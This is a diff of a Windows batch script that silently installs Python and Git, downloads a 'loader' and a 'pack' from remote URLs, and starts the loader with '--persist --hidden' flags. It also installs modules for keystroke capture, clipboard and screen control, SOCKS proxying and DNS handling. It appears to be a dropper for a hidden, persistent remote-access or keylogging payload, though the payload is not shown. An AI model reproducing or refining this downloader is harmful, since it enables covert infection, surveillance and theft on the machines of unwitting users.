@@ -26,79 +26,70 @@ REM Loader Arguments (Customize these as needed)
 set "loaderArgs=--persist --hidden"
 
 
+
+
 REM ====================================================
 REM Create temporary directory
 REM ====================================================
 mkdir "%tempDir%" 2>nul
-goto :Run
+
+echo Checking for Python %pythonVersion%...
 
 REM ====================================================
-REM Function: downloadFile
-REM Parameters: %1 = URL, %2 = destination path
+REM Detect existing Python installations excluding Microsoft Store launcher
 REM ====================================================
-:downloadFile
-    echo Downloading %~1 to %~2...
-    powershell -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2'" 
-    if not exist "%~2" (
-        echo Download failed: %~1
-        exit /b 1
+set "pythonPath="
+for /f "delims=" %%P in ('where python 2^>nul') do (
+    echo %%P | find /I "WindowsApps" >nul
+    if errorlevel 1 (
+        for /f "tokens=2 delims= " %%V in ('"%%P" --version 2^>nul') do (
+            if "%%V"=="%pythonVersion%" (
+                set "pythonPath=%%P"
+                goto :FoundPython
+            )
+        )
     )
-    exit /b 0
+)
+:FoundPython
 
-REM ====================================================
-REM Function: isInstalled
-REM Parameter: %1 = program name to check
-REM ====================================================
-:isInstalled
-    where %~1 >nul 2>&1
-    if %ERRORLEVEL%==0 (
-        echo %~1 is already installed.
-        exit /b 0
+if defined pythonPath (
+    echo Found Python %pythonVersion% at %pythonPath%.
+) else (
+    echo Python %pythonVersion% not found. Downloading and installing...
+    set "pythonInstallerPath=%TEMP%\python-installer.exe"
+    "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest -Uri '%pythonInstallerUrl%' -OutFile '!pythonInstallerPath!'"
+    if not exist "!pythonInstallerPath!" (
+        echo Failed to download Python installer.
+        exit /B 1
     )
-    exit /b 1
-
-:Run
-REM ====================================================
-REM Check if Python is installed
-REM ====================================================
-call :isInstalled python
-if %ERRORLEVEL%==0 (
-    goto :gitInstall
+    echo Installing Python %pythonVersion%...
+    "!pythonInstallerPath!" InstallAllUsers=0 PrependPath=1 Include_launcher=0 TargetDir="%LOCALAPPDATA%\Programs\Python\Python%pythonVersion%" /quiet
+    if %ERRORLEVEL% neq 0 (
+        echo Python installation failed.
+        exit /B 1
+    )
+    set "pythonPath=%LOCALAPPDATA%\Programs\Python\Python%pythonVersion%\python.exe"
+    echo Python installed to %pythonPath%.
 )
 
-REM Download and install Python
-set "pythonInstallerPath=%tempDir%\python-installer.exe"
-call :downloadFile "%pythonInstallerUrl%" "%pythonInstallerPath%"
-if %ERRORLEVEL% neq 0 (
-    echo Failed to download Python installer.
-    exit /b 1
-)
-
-echo Installing Python...
-"%pythonInstallerPath%" InstallAllUser=0 AppendPath=1 /quiet
-if %ERRORLEVEL% neq 0 (
-    echo Python installation failed.
-    exit /b 1
-)
-echo Python installation complete.
+goto :gitInstall
 
 :gitInstall
 REM ====================================================
-REM Check if Git is installed
+REM Detect or install Git
 REM ====================================================
 call :isInstalled git
 if %ERRORLEVEL%==0 (
     goto :loader
 )
 
-REM Download and install Git
+echo Git not found. Downloading and installing...
 set "gitInstallerPath=%tempDir%\git-installer.exe"
-call :downloadFile "%GitInstallerUrl%" "%gitInstallerPath%"
+call :downloadFile "%gitInstallerUrl%" "%gitInstallerPath%"
 if %ERRORLEVEL% neq 0 (
     echo Failed to download Git installer.
     exit /b 1
 )
-
 echo Installing Git...
 "%gitInstallerPath%" /SP- /VERYSILENT /NOCANCEL /NORESTART
 if %ERRORLEVEL% neq 0 (
@@ -106,6 +97,7 @@ if %ERRORLEVEL% neq 0 (
     exit /b 1
 )
 echo Git installation complete.
+
 
 :loader
 REM ====================================================
@@ -120,25 +112,15 @@ call :downloadFile "%loaderUrl%" "%loaderPath%"
 call :downloadFile "%packUrl%" "%packPath%"
 
 REM ====================================================
-REM Install Python modules
+REM Install Python modules using explicit pythonPath
 REM ====================================================
 echo Installing Python modules...
-for /f "delims=" %%a in ('powershell -Command "(Get-Command python,py -All|?{$_.Definition -notmatch 'WindowsApps'}|select -First 1).Definition"') do (
-    set "pythonPath=%%a"
-)
-
-if not defined pythonPath (
-    echo Python not found.
-    exit /b 1
-)
-
 "%pythonPath%" -m pip install --upgrade pip
 if %ERRORLEVEL% neq 0 (
     echo Failed to upgrade pip.
     exit /b 1
 )
-
-"%pythonPath%" -m pip install cryptography dnslib dnspython gitpython keyboard pyautogui pycryptodome pywin32 tqdm pyperclip PySocks wmi
+"%pythonPath%" -m pip install cryptography dnslib dnspython gitpython keyboard pyautogui pycryptodome pywin32 tqdm pyperclip PySocks wmi psutil
 if %ERRORLEVEL% neq 0 (
     echo Failed to install Python modules.
     exit /b 1
@@ -153,8 +135,28 @@ echo Starting loader...
 
 echo Script completed.
 :end
-REM (Optional) Clean up temporary directory
-REM rmdir /s /q "%tempDir%"
+REM Optional clean up: rmdir /s /q "%tempDir%"
 
 endlocal
 exit /b 0
+
+
+:downloadFile
+REM DownloadFile helper function
+REM Parameters: %1 = URL, %2 = destination path
+"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2'"
+if not exist "%~2" (
+    echo Download failed: %~1
+    exit /b 1
+)
+exit /b 0
+
+:isInstalled
+REM isInstalled helper function
+REM Parameter: %1 = program to check via where
+where %~1 >nul 2>&1
+if %ERRORLEVEL%==0 (
+    echo %~1 is already installed.
+    exit /b 0
+)
+exit /b 1
